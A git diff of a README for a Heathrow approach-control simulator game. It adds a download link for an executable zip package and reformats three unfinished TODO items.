@@ -1,5 +1,9 @@
 # ATC Simulator (EGLL/LHR)
 
+UPDATE Oct 13, 2025
+The executable package is now available here: [ATC-Sim-1.0.zip](https://github.com/user-attachments/files/22893989/ATC-Sim-1.0.zip)
+
+
 This is an ATC simulator game (currently only for EGLL/LHR), inspired by [atc-sim.com](http://atc-sim.com).
 
 As an approach controller, you guide inbound traffic to intercept the ILS and land safely.
@@ -10,9 +14,9 @@ The implementation is still in progress. TODOs (mostly in this order):
 - [x] Scoring system  
 - [x] Improper exits detection  
 - [x] Fast forwarding  
-- [ ] Text-to-speech models deployed for sound  
-- [ ] Speech-to-text + LM models deployed for verbal commands  
-- [ ] Game crash protections for invalid commands  
+- [ ] Text-to-speech models deployed for sound
+- [ ] Speech-to-text + LM models deployed for verbal commands
+- [ ] Game crash protections for invalid commands
 - [ ] More realistic constraints (speed, altitude, ILS interception restrictions, SID/STAR procedures, terrain/winds, etc.)  
 - [ ] Departure aircrafts (all aircrafts right now are arrival traffic)  
 - [ ] Aircraft types  
